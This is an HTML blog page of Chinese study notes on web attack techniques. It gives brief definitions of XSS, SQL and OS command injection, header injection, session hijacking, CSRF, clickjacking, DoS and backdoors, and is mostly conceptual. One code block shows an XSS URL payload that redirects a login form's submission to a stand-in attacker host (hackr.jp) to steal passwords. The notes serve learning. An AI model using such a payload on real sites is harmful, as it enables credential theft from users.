@@ -1,0 +1,92 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>Web攻击技术 | 香蕉弦定李</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Web攻击技术</h1><a id="logo" href="/.">香蕉弦定李</a><p class="description">学习笔记</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Web攻击技术</h1><div class="post-meta">Sep 11, 2019</div><div class="post-content"><h2 id="Web攻击技术"><a href="#Web攻击技术" class="headerlink" title="Web攻击技术"></a>Web攻击技术</h2><h3 id="一-针对Web的攻击技术"><a href="#一-针对Web的攻击技术" class="headerlink" title="一. 针对Web的攻击技术"></a>一. 针对Web的攻击技术</h3><h4 id="1-HTTP-不具备必要的安全功能"><a href="#1-HTTP-不具备必要的安全功能" class="headerlink" title="1. HTTP 不具备必要的安全功能"></a>1. HTTP 不具备必要的安全功能</h4><blockquote>
+<p>HTTP 不具备必要的安全功能，开发者需要自行设计并开发认证及会话管理功能来满足 Web<br>应用的安全。</p>
+</blockquote>
+<h4 id="2-在客户端即可篡改请求"><a href="#2-在客户端即可篡改请求" class="headerlink" title="2. 在客户端即可篡改请求"></a>2. 在客户端即可篡改请求</h4><blockquote>
+<p>在HTTP请求报文内加载攻击代码，就能发起对 Web 应用的攻击。通过 URL 查询字段或表单、HTTP 首部、Cookie 等途径把攻击代码传入，若这时 Web 应用存在安全漏洞，那内部信息就会遭到窃取，或被攻击者拿到管理权限。</p>
+</blockquote>
+<h4 id="3-针对-Web-应用的攻击模式"><a href="#3-针对-Web-应用的攻击模式" class="headerlink" title="3. 针对 Web 应用的攻击模式"></a>3. 针对 Web 应用的攻击模式</h4><h5 id="主动攻击-eg-SQL注入-OS命令注入"><a href="#主动攻击-eg-SQL注入-OS命令注入" class="headerlink" title="主动攻击 eg:SQL注入 OS命令注入"></a>主动攻击 eg:SQL注入 OS命令注入</h5><blockquote>
+<p>攻击者通过直接访问 Web 应用，把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到那些资源。</p>
+</blockquote>
+<h5 id="被动攻击-eg-跨站脚本攻击、跨站点请求伪造"><a href="#被动攻击-eg-跨站脚本攻击、跨站点请求伪造" class="headerlink" title="被动攻击 eg:跨站脚本攻击、跨站点请求伪造"></a>被动攻击 eg:跨站脚本攻击、跨站点请求伪造</h5><blockquote>
+<p>被动攻击（passive attack）是指利用圈套策略执行攻击代码的攻击模式。在被动攻击过程中，攻击者不直接对目标 Web 应用访问发起攻击。</p>
+</blockquote>
+<blockquote>
+<p>利用被动攻击，可发起对原本从互联网上无法直接访问的企业内<br>网等网络的攻击。只要用户踏入攻击者预先设好的陷阱，在用户<br>能够访问到的网络范围内，即使是企业内网也同样会受到攻击</p>
+<ul>
+<li>步骤 1： 攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发<br>送已嵌入攻击代码的 HTTP 请求。</li>
+<li>步骤 2： 当用户不知不觉中招之后，用户的浏览器或邮件客户端<br>就会触发这个陷阱。</li>
+<li>步骤 3： 中招后的用户浏览器会把含有攻击代码的 HTTP 请求发<br>送给作为攻击目标的 Web 应用，运行攻击代码。</li>
+<li>步骤 4： 执行完攻击代码，存在安全漏洞的 Web 应用会成为攻<br>击者的跳板，可能导致用户所持的 Cookie 等个人信息被窃取，<br>登录状态中的用户权限遭恶意滥用等后果。</li>
+</ul>
+</blockquote>
+<h3 id="二-因输出值转义不完全引发的安全漏洞"><a href="#二-因输出值转义不完全引发的安全漏洞" class="headerlink" title="二. 因输出值转义不完全引发的安全漏洞"></a>二. 因输出值转义不完全引发的安全漏洞</h3><p>实施 Web 应用的安全对策可大致分为以下两部分。</p>
+<p><strong>客户端的验证</strong></p>
+<blockquote>
+<p>多数情况下采用 JavaScript 在客户端验证数据。可是在客户端允许篡改数据或关闭 JavaScript，不适合将 JavaScript 验证作为安全的防范对策。保留客户端验证只是为了尽早地辨识输入错误，起到提高UI体验的作用。</p>
+</blockquote>
+<p><strong>服务器端的验证</strong></p>
+<ul>
+<li><p>输入值验证</p>
+<blockquote>
+<p>输入值验证通常是指检查是否是符合系统业<br>务逻辑的数值或检查字符编码等预防对策</p>
+</blockquote>
+</li>
+<li><p>输出值转义</p>
+<blockquote>
+<p>从数据库或文件系统、HTML、邮件等输出 Web 应用处理的数据之<br>际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转<br>义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损<br>害。</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="跨站脚本攻击（Cross-Site-Scripting，XSS）"><a href="#跨站脚本攻击（Cross-Site-Scripting，XSS）" class="headerlink" title="跨站脚本攻击（Cross-Site Scripting，XSS）"></a>跨站脚本攻击（Cross-Site Scripting，XSS）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 通过地址栏中 URI 的查询字段指定 ID，即相当于在表单内自动填写字符串的功能</span><br><span class="line">http://example.jp/login?ID=yama</span><br><span class="line"></span><br><span class="line">#嵌入恶意代码的 URL欺骗用户点击，输入表单，泄露用户信息</span><br><span class="line">http://example.jp/login?ID=&quot;&gt;&lt;script&gt;var+f=document.getElementById(login);+f.action=http://hackr.jp/pwget;+f.method=get;%3C/script%3E%3Cspan+s=</span><br><span class="line"></span><br><span class="line">#此外还可以对用户 Cookie 的窃取攻击</span><br></pre></td></tr></table></figure>
+
+<h4 id="SQL-注入攻击"><a href="#SQL-注入攻击" class="headerlink" title="SQL 注入攻击"></a>SQL 注入攻击</h4><blockquote>
+<p>SQL 注入攻击时，很有可能会导致用户信息或结算内容等其他数据表的非法浏览及篡改，从而使用户遭受不同程度的损失。</p>
+</blockquote>
+<h4 id="OS-命令注入攻击"><a href="#OS-命令注入攻击" class="headerlink" title="OS 命令注入攻击"></a>OS 命令注入攻击</h4><blockquote>
+<p>OS 命令注入攻击是指通过 Web 应用，执行<br>非法的操作系统命令达到攻击的目的。只要在能调用 Shell 函数的地方就有存在被攻击的风险。<br>通过 OS 注入攻击可执行 OS 上安<br>装着的各种程序。</p>
+</blockquote>
+<h4 id="HTTP-首部注入攻击-被动攻击"><a href="#HTTP-首部注入攻击-被动攻击" class="headerlink" title="HTTP 首部注入攻击(被动攻击)"></a>HTTP 首部注入攻击(被动攻击)</h4><p>指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击</p>
+<p>HTTP 首部注入攻击有可能会造成以下一些影响。</p>
+<ul>
+<li>设置任何 Cookie 信息</li>
+<li>重定向至任意 URL</li>
+<li>显示任意的主体（HTTP 响应截断攻击）<h4 id="邮件首部注入攻击"><a href="#邮件首部注入攻击" class="headerlink" title="邮件首部注入攻击"></a>邮件首部注入攻击</h4><h4 id="目录遍历攻击"><a href="#目录遍历攻击" class="headerlink" title="目录遍历攻击"></a>目录遍历攻击</h4><h4 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h4></li>
+</ul>
+<h3 id="三-因设置或设计上的缺陷引发的安全漏洞"><a href="#三-因设置或设计上的缺陷引发的安全漏洞" class="headerlink" title="三. 因设置或设计上的缺陷引发的安全漏洞"></a>三. 因设置或设计上的缺陷引发的安全漏洞</h3><h4 id="强制浏览"><a href="#强制浏览" class="headerlink" title="强制浏览"></a>强制浏览</h4><h4 id="不正确的错误消息处理"><a href="#不正确的错误消息处理" class="headerlink" title="不正确的错误消息处理"></a>不正确的错误消息处理</h4><h4 id="开放重定向"><a href="#开放重定向" class="headerlink" title="开放重定向"></a>开放重定向</h4><blockquote>
+<p>开放重定向（Open Redirect）是一种对指定的任意 URL 作重定向跳转<br>的功能。而于此功能相关联的安全漏洞是指，假如指定的重定向 URL<br>到某个具有恶意的 Web 网站，那么用户就会被诱导至那个 Web 网<br>站</p>
+</blockquote>
+<h3 id="四-因会话管理疏忽引发的安全漏洞"><a href="#四-因会话管理疏忽引发的安全漏洞" class="headerlink" title="四. 因会话管理疏忽引发的安全漏洞"></a>四. 因会话管理疏忽引发的安全漏洞</h3><h4 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h4><blockquote>
+<p>会话劫持（Session Hijack）是指攻击者通过某种手段拿到了用户的会话 ID，并非法使用此会话 ID 伪装成用户，达到攻击的目的</p>
+</blockquote>
+<h4 id="会话固定攻击"><a href="#会话固定攻击" class="headerlink" title="会话固定攻击"></a>会话固定攻击</h4><blockquote>
+<p>对以窃取目标会话 ID 为主动攻击手段的会话劫持而言，会话固定攻击（Session Fixation）攻击会强制用户使用攻击者指定的会话 ID，属于被动攻击。</p>
+</blockquote>
+<h4 id="跨站点请求伪造"><a href="#跨站点请求伪造" class="headerlink" title="跨站点请求伪造"></a>跨站点请求伪造</h4><blockquote>
+<p>跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。</p>
+</blockquote>
+<h3 id="五-其他安全漏洞"><a href="#五-其他安全漏洞" class="headerlink" title="五. 其他安全漏洞"></a>五. 其他安全漏洞</h3><h4 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h4><blockquote>
+<p>密码破解攻击（Password Cracking）即算出密码，突破认证。攻击不<br>仅限于 Web 应用，还包括其他的系统（如 FTP 或 SSH 等），本节将<br>会讲解对具备认证功能的 Web 应用进行的密码破解。</p>
+</blockquote>
+<p>密码破解有以下两种手段。</p>
+<ul>
+<li>通过网络的密码试错</li>
+<li>对已加密密码的破解（指攻击者入侵系统，已获得加密或散列处理的密码数据的情况）<h4 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h4><blockquote>
+<p>点击劫持（Clickjacking）是指利用透明的按钮或链接做成陷阱，覆盖<br>在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个链接<br>访问内容的一种攻击手段。这种行为又称为界面伪装（UI<br>Redressing）。</p>
+</blockquote>
+<h4 id="DoS-攻击"><a href="#DoS-攻击" class="headerlink" title="DoS 攻击"></a>DoS 攻击</h4><blockquote>
+<p>DoS 攻击（Denial of Service attack）是一种让运行中的服务呈停止状态的攻击。有时也叫做服务停止攻击或拒绝服务攻击。DoS 攻击的对象不仅限于 Web 网站，还包括网络设备及服务器等。</p>
+</blockquote>
+</li>
+</ul>
+<p>主要有以下两种 DoS 攻击方式。</p>
+<ul>
+<li>集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈停止状态。</li>
+<li>通过攻击安全漏洞使服务停止。</li>
+</ul>
+<blockquote>
+<p>集中利用访问请求的 DoS 攻击，单纯来讲就是发送大量的合<br>法请求。服务器很难分辨何为正常请求，何为攻击请求，因此很难防<br>止 DoS 攻击</p>
+</blockquote>
+<h4 id="后门程序"><a href="#后门程序" class="headerlink" title="后门程序"></a>后门程序</h4><blockquote>
+<p>后门程序（Backdoor）是指开发设置的隐藏入口，可不按正常步骤使<br>用受限功能。利用后门程序就能够使用原本受限制的功能。</p>
+</blockquote>
+</div><div class="tags"><a href="/tags/计算机网络/">计算机网络</a></div><div class="post-nav"><a class="pre" href="/2019/09/11/图解_HTTP/">图解HTTP</a><a class="next" href="/2019/07/22/shell编程/">shell编程简单语法</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/javaweb/">javaweb</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/前端/">前端</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/博客配置/">博客配置</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/数据库/">数据库</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/电脑/">电脑</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/IDEA/" style="font-size: 15px;">IDEA</a> <a href="/tags/Spring/" style="font-size: 15px;">Spring</a> <a href="/tags/vscode/" style="font-size: 15px;">vscode</a> <a href="/tags/hexo/" style="font-size: 15px;">hexo</a> <a href="/tags/Vue/" style="font-size: 15px;">Vue</a> <a href="/tags/odoo/" style="font-size: 15px;">odoo</a> <a href="/tags/mysql/" style="font-size: 15px;">mysql</a> <a href="/tags/JVM/" style="font-size: 15px;">JVM</a> <a href="/tags/数据分析/" style="font-size: 15px;">数据分析</a> <a href="/tags/计算机网络/" style="font-size: 15px;">计算机网络</a></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">香蕉弦定李.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
